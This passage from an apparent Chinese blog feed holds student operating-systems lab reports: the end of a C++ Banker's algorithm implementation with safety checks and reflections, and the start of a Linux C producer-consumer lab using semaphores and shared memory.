class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (j == resourceNum)<br>&#123;<br><span class="hljs-comment">//尝试分配，修改数据结构的值</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>available[j] -= request[j];<br>allocation[i][j] += request[j];<br>need[i][j] -= request[j];<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;开始检查系统安全性：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isSafe</span>())<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;分配成功！\n&quot;</span>;<br><span class="hljs-built_in">showInfo</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//分配失败，则恢复数据结构的值</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>available[j] += request[j];<br>allocation[i][j] -= request[j];<br>need[i][j] += request[j];<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;分配失败！\n&quot;</span>;<br><span class="hljs-built_in">showInfo</span>();<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="程序运行时的初值和运行结果"><a href="#程序运行时的初值和运行结果" class="headerlink" title="程序运行时的初值和运行结果"></a>程序运行时的初值和运行结果</h2><ul><li>已结合思考题要求</li></ul><h3 id="初值"><a href="#初值" class="headerlink" title="初值"></a>初值</h3><ol><li>初始化</li></ol><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128221710336.png" alt="image-20211128215453437"></p><ol><li><p>三次申请资源</p><p>①</p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128215606893.png" alt="image-20211128215606893"></p><p>②</p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128215732054.png" alt="image-20211128215732054"></p><p>③</p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128215819214.png" alt="image-20211128215819214"></p></li></ol><h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128221739018.png" alt="image-20211128221739018"></p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128221042945.png" alt="image-20211128221042945"></p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128221106632.png" alt="image-20211128221106632"></p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211128221952657.png" alt="image-20211128221952657"></p><h2 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h2><p>设计本实验时，就尽可能的将设计人性化和考虑全面。如：能不断地进行资源分配；能修改资源的初始状态；提示信息就能充分反映算法过程等。</p><ul><li><p>不断进行资源分配、提示信息就能充分反映算法过程等，在前文的代码中已经实现。为了能够在中途修改资源的状态，增加自定义函数<code>change()</code>置于检查安全性的算法<code>isSafe()</code>中，改变的部分如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C++"><span class="hljs-comment">//修改资源分配的函数</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">change</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">bool</span> flag = <span class="hljs-literal">false</span>;<br><span class="hljs-type">int</span> i,j;<br><span class="hljs-type">char</span> ch;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;是否要改变资源分配状态（Y：是，N：否）：&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; ch;<br><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;Y&#x27;</span>)<br>&#123;<br>flag = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;请选择需要改变的进程：&quot;</span> &lt;&lt; endl;<br>cin &gt;&gt; i;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入它最新的最大需求矩阵Max：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cin &gt;&gt; Max[i][j];<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入它最新的分配矩阵allocation：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>cin &gt;&gt; allocation[i][j];<br>&#125;<br><span class="hljs-comment">//更新需求矩阵</span><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br>need[i][j] = Max[i][j] - allocation[i][j];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;请依次输入各资源的名称（不超过6个字符）和可用数目：&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span class="hljs-string">&quot;例：A 3 B 3 C 2&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; resourceNum; i++)<br>&#123;<br>cin &gt;&gt; resource[i] &gt;&gt; available[i];<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-comment">//安全性检查算法</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSafe</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> i, j, k;<br><span class="hljs-type">int</span> round= <span class="hljs-number">0</span>; <span class="hljs-comment">//循环轮数</span><br><span class="hljs-type">int</span> FinishNum = <span class="hljs-number">0</span>; <span class="hljs-comment">//已完成的进程数</span><br><span class="hljs-comment">//work初始化</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; resourceNum; i++)<br>&#123;<br>work[i] = available[i];<br>&#125;<br><span class="hljs-comment">//Finish初始化</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br>Finish[i] = <span class="hljs-literal">false</span>;<br>&#125;<br>i = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (FinishNum &lt; processNum) <span class="hljs-comment">//有进程未完成</span><br>&#123;<br>j = <span class="hljs-number">0</span>; <span class="hljs-comment">//每次检查前，j需要初始化为0</span><br><span class="hljs-comment">//当前进程i是否满足Finish==false并且need&lt;work</span><br><span class="hljs-keyword">if</span> (Finish[i] == <span class="hljs-literal">false</span>)<br>&#123;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; resourceNum; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (need[i][j] &gt; work[j])<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//满足上面的条件则进行第3步：分配并释放资源，完成进程，记录于安全序列</span><br><span class="hljs-keyword">if</span> (j == resourceNum)<br>&#123;<br>Finish[i] = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>work[k] += allocation[i][k];<br>&#125;<br><span class="hljs-comment">//输出当前可用资源数</span><br>cout &lt;&lt; <span class="hljs-string">&quot;进程&quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot;执行完成，释放资源。&quot;</span> &lt;&lt; <span class="hljs-string">&quot;当前可用资源数如下：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; resource[k];<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; resourceNum; k++)<br>&#123;<br>cout &lt;&lt; left &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; work[k];<br>&#125;<br>cout &lt;&lt; endl;<br>safe[FinishNum] = i;<br>FinishNum++;<br>&#125;<br>i++; <span class="hljs-comment">//检查下一个进程</span><br><span class="hljs-keyword">if</span> (i &gt;= processNum) <span class="hljs-comment">//循环了一轮</span><br>&#123;<br>i %= processNum;<br><span class="hljs-keyword">if</span> (temp == FinishNum &amp;&amp; round &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">//再次循环后进程完成数没有变化，则没有可以完成的进程了</span><br><span class="hljs-keyword">break</span>;<br>round++;<br>temp = FinishNum; <span class="hljs-comment">//记录本次循环的FinishNum</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (FinishNum == processNum)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;系统安全，安全序列为：&quot;</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; processNum; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;P&quot;</span> &lt;&lt; safe[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;剩余进程无法完成，系统不安全！&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">change</span>())<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;将重新进行检查系统安全性：&quot;</span>;<br>            <span class="hljs-built_in">display</span>();<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">isSafe</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211204171631704.png" alt="image-20211204171631704"></p><p><img src="/2021/11/29/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%AE%9E%E9%AA%8C_%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/image-20211204171738177.png" alt="image-20211204171738177"></p><h2 id="实验总结和心得"><a href="#实验总结和心得" class="headerlink" title="实验总结和心得"></a>实验总结和心得</h2><ul><li>设计本实验，如何设计得更人性化，考虑得更全面是值得注意的。要用打印的提示信息尽量美观且反映算法过程，这使得我和<code>cout</code>纠缠不清了一段时间。整个实验过程中，我也是在不断地发现问题、观察调试、解决问题，好在最后效果不错。</li><li>整个实验逻辑比较清晰，具体流程在实验指导书中都有说明。将算法思想转化为实际代码去实现，让我对银行家算法的算法思想和设计有了更加深刻的了解，较好地锻炼了我的逻辑思维和编程能力。</li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生产者-消费者问题的C语言实现</title>
    <link href="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="实验六-生产者-消费者问题实现"><a href="#实验六-生产者-消费者问题实现" class="headerlink" title="实验六 生产者-消费者问题实现"></a>实验六 生产者-消费者问题实现</h1><h2 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><ul><li><p>在Linux操作系统下用C实现经典同步问题：生产者—消费者，具体要求如下：</p><p>(1) 一个大小为10的缓冲区，初始状态为空。<br>(2) 2个生产者，随机等待一段时间，往缓冲区中添加数据，若缓冲区已满，等待消费者取走数据之后再添加，重复10次。<br>(3) 2个消费者，随机等待一段时间，从缓冲区中读取数据，若缓冲区为空，等待生产者添加数据之后再读取，重复10次。</p></li></ul><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul><li><p>本实验的主要目的是模拟操作系统中进程同步和互斥。在系统进程并发执行异步推进的过程中，由于资源共享和进程间合作而造成进程间相互制约。进程间的相互制约有两种不同的方式。</p><p>（1）间接制约。这是由于多个进程共享同一资源（如CPU、共享输入/输出设备）而引起的，即共享资源的多个进程因系统协调使用资源而相互制约。<br>（2）直接制约。只是由于进程合作中各个进程为完成同一任务而造成的，即并发进程各自的执行结果互为对方的执行条件，从而限制各个进程的执行速度。</p></li><li><p><strong>生产者和消费者是经典的进程同步问题</strong>，在这个问题中，生产者不断的向缓冲区中写入数据，而消费者则从缓冲区中读取数据。生产者进程和消费者对缓冲区的操作是互斥，即当前只能有一个进程对这个缓冲区进行操作，生产者进入操作缓冲区之前，先要看缓冲区是否已满，如果缓冲区已满，则它必须等待消费者进程将数据取出才能写入数据，同样的，消费者进程从缓冲区读取数据之前，也要判断缓冲区是否为空，如果为空，则必须等待生产者进程写入数据才能读取数据。</p></li><li><p><strong>在本实验中，进程之间要进行通信来操作同一缓冲区</strong>。一般来说，进程间的通信根据通信内容可以划分为两种：即控制信息的传送与大批量数据传送。有时，也把进程间控制信息的交换称为低级通信，而把进程间大批量数据的交换称为高级通信。目前，计算机系统中用得比较普遍的高级通信机制可分为3大类：共享存储器系统、消息传递系统及管道通信系统。</p><ul><li>共享存储器系统：共享存储器系统为了传送大量数据，在存储器中划出一块共享存储区，诸进程可通过对共享存储区进行读数据或写数据以实现通信。进程在通信之前，向系统申请共享存储区中的一个分区，并为它指定一个分区关键字。</li><li>消息传递系统：在消息传递系统中，进程间的数据交换以消息为单位，在计算机网络中被称为报文。消息传递系统的实现方式又可以分为以下两种：<ul><li>直接通信方式：发送进程可将消息直接发送给接收进程，即将消息挂在接收进程的消息缓冲队列上，而接收进程可从自己的消息缓冲队列中取得消息。</li><li>间接通信方式：发送进程将消息发送到指定的信箱中，而接收进程从信箱中取得消息。这种通信方式又称信箱通信方式，被广泛地应用于计算机网络中。相应地，该消息传递系统被称为电子邮件系统。</li></ul></li><li>管道通信系统：向管道提供输入的发送进程，以字符流方式将大量的数据送入管道，而接收进程从管道中接收数据。由于发送进程和接收进程是利用管道进行通信的，故称为管道通信。为了协调发送和接收双方的通信，管道通信机制必须提供以下3方面的协调功能：<ul><li>互斥：当一个进程正在对pipe文件进行读或写操作时，另一个进程必须等待。</li><li>同步：当写进程把一定数量的数据写入pipe文件后，便阻塞等待，直到读进程取走数据后，再把写进程唤醒。</li><li>确认对方是否存在：只有确定对方已存在时，才能进行管道通信，否则会造成因对方不存在而无限制地等待。</li></ul></li></ul></li><li><strong>在这个问题当中，我们采用信号量机制进行进程之间的通信</strong>，设置两个信号量，空的信号量和满的信号量。</li><li>在Linux系统中，一个或多个信号量构成一个信号量集合。使用信号量机制可以实现进程之间的同步和互斥，允许并发进程一次对一组信号量进行相同或不同的操作。每个P、V操作不限于减1或加1，而是可以加减任何整数。在进程终止时，系统可根据需要自动消除所有被进程操作过的信号量的影响。<ol><li>缓冲区采用循环队列表示，利用头、尾指针来存放、读取数据，以及判断队列是否为空。缓冲区中数组大小为10；</li><li>利用随机函数rand()得到A～Z的一个随机字符，作为生产者每次生产的数据，存放到缓冲区中；</li><li>使用<code>shmget()</code>系统调用实现共享主存段的创建，<code>shmget()</code>返回共享内存区的ID。对于已经申请到的共享段，进程需把它附加到自己的虚拟空间中才能对其进行读写。</li><li>信号量的建立采用<code>semget()</code>函数，同时建立信号量的数量。在信号量建立后，调用<code>semctl()</code>对信号量进行初始化，例如本实验中，可以建立两个信号<code>SEM_EMPTY</code>、<code>SEM_FULL</code>，初始化时设置<code>SEM_EMPTY</code>为10，<code>SEM_FULL</code>为0。使用操作信号的函数<code>semop()</code>做排除式操作，使用这个函数防止对共享内存的同时操作。对共享内存操作完毕后采用<code>shmctl()</code>函数撤销共享内存段。</li><li>使用循环，创建2个生产者以及2个消费者，采用函数fork()创建一个新的进程。</li><li>一个进程的一次操作完成后，采用函数<code>fflush()</code>刷新缓冲区。</li><li>程序最后使用<code>semctl()</code>函数释放内存。</li></ol></li></ul><h3 id="模拟程序的程序流程图"><a href="#模拟程序的程序流程图" class="headerlink" title="模拟程序的程序流程图"></a>模拟程序的程序流程图</h3><ol><li><p>主程序流程图：</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130170622160.png" alt="image-20211130170622160"></p></li></ol><ol><li><p>生产者进程流程图</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130170647133.png" alt="image-20211130170647133"></p></li><li><p>消费者进程流程图</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130170703721.png" alt="image-20211130170703721"></p></li><li><p>P操作流程图</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130170722493.png" alt="image-20211130170722493"></p></li><li><p>V操作流程图</p><p><img src="/2021/11/29/%E5%AE%9E%E9%AA%8C%E5%85%AD_%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20211130170725692.png" alt="image-20211130170725692"></p></li></ol><h2 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h2><ol><li><p>自定义结构体<code>buf</code>：实现循环队列</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> //循环队列</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> in; <span class="hljs-comment">//指向缓冲中下一个空位</span><br><span class="hljs-type">int</span> out; <span class="hljs-comment">//指向缓冲中第一个满位</span><br><span class="hljs-type">char</span> str[MAX_BUFFER_SIZE]; <span class="hljs-comment">//存放字母</span><br><span class="hljs-type">int</span> num; <span class="hljs-comment">//产品个数</span><br><span class="hljs-type">int</span> is_empty; <span class="hljs-comment">//是否为空</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">buf</span> *<span class="hljs-title">bf</span>;</span> <span class="hljs-comment">//定义一个循环队列指针</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>库<code>&lt;sys/time.h&gt;</code>中的结构体<code>timeval</code>：实现时间</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct timeval</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    time_t      tv_sec;     //seconds </span><br><span class="hljs-comment">    suseconds_t tv_usec;    //icroseconds </span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">start</span>;</span> <span class="hljs-comment">//开始时间</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">now</span>;</span> <span class="hljs-comment">//当前时间</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>库<code>&lt;sys/sem.h&gt;</code>中的结构体<code>sembuf</code>：对信号量操作</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct sembuf</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    unsigned short int sem_num;    //信号量编号</span><br><span class="hljs-comment">    short int sem_op;              //对信号量的操作</span><br><span class="hljs-comment">    short int sem_flg;             //通常设为SEM_UNDO</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sembuf</span> <span class="hljs-title">sb</span>;</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>整型</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_BUFFER_SIZE 10</span><br><span class="hljs-comment">//共享内存和信号量：当前用户的进程可读写</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHM_MODE 0600</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_MODE 0600</span><br><span class="hljs-comment">//信号量的键值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_FULL 1     <span class="hljs-comment">//信号量 1 --- full</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEM_EMPTY 2    <span class="hljs-comment">//信号量 2 --- empty </span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MUTEX 3        <span class="hljs-comment">//信号量 3 --- 互斥量</span></span><br><span class="hljs-comment">//共享内存的键值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SHMKEY 75</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Consumer = <span class="hljs-number">2</span>; <span class="hljs-comment">//消费者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Producer = <span class="hljs-number">2</span>; <span class="hljs-comment">//生产者数量</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Buffer = <span class="hljs-number">10</span>; <span class="hljs-comment">//缓冲区大小</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N_Worktime = <span class="hljs-number">10</span>; <span class="hljs-comment">//每个进程执行的次数</span><br><span class="hljs-type">int</span> shm_id; <span class="hljs-comment">//shmget函数返回的共享内存标识符</span><br><span class="hljs-type">int</span> full, empty, mutex; <span class="hljs-comment">//semget函数返回的信号量标识符</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>void指针</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">void</span> *addr; <span class="hljs-comment">//地址指针，连接共享内存段的地址空间</span><br></code></pre></div></td></tr></table></figure></li></ol><ol><li><p>自定义函数（实现详见下方代码）：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 